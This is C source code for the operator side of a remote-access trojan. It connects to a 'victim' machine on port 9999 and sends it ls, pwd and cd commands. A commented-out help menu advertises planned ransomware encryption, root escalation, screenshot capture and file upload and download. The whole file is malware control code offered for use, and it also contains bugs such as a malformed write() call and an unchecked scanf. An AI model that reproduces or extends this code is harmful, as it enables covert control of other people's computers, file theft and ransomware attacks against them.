#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/stat.h>

#define PORT 9999
#define TRUE 1
#define BUFSIZE 1024

void connect_Server(char* ipAddress);
void print_help_Command();

//print error func
void error_handling(char *message);

int clnt_sock;

int main(int argc, char **argv){

    char menu[BUFSIZE];
    char temp[20];
    int status;
    int size;
    int filehandle;
    char *file;

    if (argc != 2){
        printf("Usage : %s <IP>\n", argv[0]);
        exit(1);
    }

    connect_Server(argv[1]);

    //system call clear
    system("clear");
    print_help_Command();
    while (TRUE) {
        // command line
        printf("\033[1;32mCommand line > ");
        fgets(menu, BUFSIZE, stdin);
        fprintf(stderr, "\033[97m");

        // help command
        if(!strcmp(menu, "help\n"))
            print_help_Command();

        else if(!strcmp(menu, "quit\n")){
            send(clnt_sock, menu, sizeof(menu) + 1, 0);
            recv(clnt_sock, &status, sizeof(int), 0);
            if(status)
                exit(0);
        }

        // ls command
        else if(!strcmp(menu, "ls\n")){
            send(clnt_sock, menu, sizeof(menu) + 1, 0);
            recv(clnt_sock, &size, sizeof(int), 0);
            file = malloc(size);
            recv(clnt_sock, file, size, 0);
            filehandle = creat("temp_ls.txt", 0777);
            write(filehandle, file, size, 0);
            close(filehandle);
            printf("\033[1;36mVictim PC's file list -----\033[1;0m\n");
            system("cat temp_ls.txt");
            system("rm temp_ls.txt");
        }

        // pwd command
        else if (!strcmp(menu, "pwd\n")) {
            strcpy(menu, "pwd");
            send(clnt_sock, menu, 100, 0);
            recv(clnt_sock, &size, sizeof(int), 0);
            file = malloc(size);
            recv(clnt_sock, file, size, 0);
            filehandle = creat("temp_pwd.txt", 0777);
            write(filehandle, file, size, 0);
            close(filehandle);
            printf("\033[1;36mVictim PC's PWD\033[1;0m\n");
            system("cat temp_pwd.txt");
            system("rm temp_pwd.txt");
        }

        // cd command
        else if (!strcmp(menu, "cd\n")) {
            strcpy(menu, "cd ");
            printf("\033[1;32mcd >> ");
            scanf("%s", menu + 3);
            fgets(temp, BUFSIZE, stdin);
            send(clnt_sock, menu, 100, 0);
            recv(clnt_sock, &status, sizeof(int), 0);
            if (status)
                printf("\033[1;31mChange complete!!\n");
            else {
                printf("\033[1;31mChange fail..\n");
            }
        }


        //send(clnt_sock, menu, sizeof(menu) + 1, 0);
    }
}

void connect_Server(char* ipAddress){


    struct sockaddr_in serv_addr;

    clnt_sock = socket(PF_INET, SOCK_STREAM, 0);
    if(clnt_sock == -1){
        error_handling("socket() error");
    }

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(ipAddress);
    serv_addr.sin_port = htons(PORT);

    if (connect(clnt_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == -1) {
        error_handling("connect() error");
    }
}

void error_handling(char *message) {
    fputs(message, stderr);
    fputc('\n', stderr);
    exit(1);
}

void print_help_Command(){
    printf("\n\033[1;36m Core Commands\n");
    printf("\033[1;36m =================\n");
    printf("\033[1;0m \n");
    printf("\033[1;0m       Command             Description\n");
    printf("\033[1;0m       -------             ---------------------\n");
    printf("\033[1;0m       help                Help menu\n");
    printf("\033[1;0m       ls                  Show contents of a directory or "
        "directories\n");
    /*printf("\033[1;0m       cd                  Change the current working "
           "directory\n");
    printf("\033[1;0m       pwd                 Prints the path of the working "
           "directory\n");
    printf("\033[1;0m       rm                  remove File\n");
    printf("\033[1;0m       ps                  Show Process list\n");
    printf("\033[1;0m       getinfo             Show user info of the file\n");
    printf("\033[1;0m       download            File download\n");
    printf("\033[1;0m       upload              File upload\n");
    printf("\033[1;0m       id                  Print User ID(UID) & Group "
           "ID(GID)\n");
    printf("\033[1;0m       clear               Clear display\n");
    printf("\033[1;0m       quit                Exit the console\n");
    printf("\033[1;0m       -------             ---------------------\n\n");
    printf("\033[1;0m       Cracking Command    Description\n");
    printf("\033[1;0m       ----------------    ---------------------\n");

    printf("\033[1;0m       ransomeware         Encryption file\n");
    printf("\033[1;0m       decryption          Decryption file\n");
    printf("\033[1;0m       getroot             GET SUPER USER\n");
    printf("\033[1;0m       screenshot          Get screenshot\n\n\n");*/
}
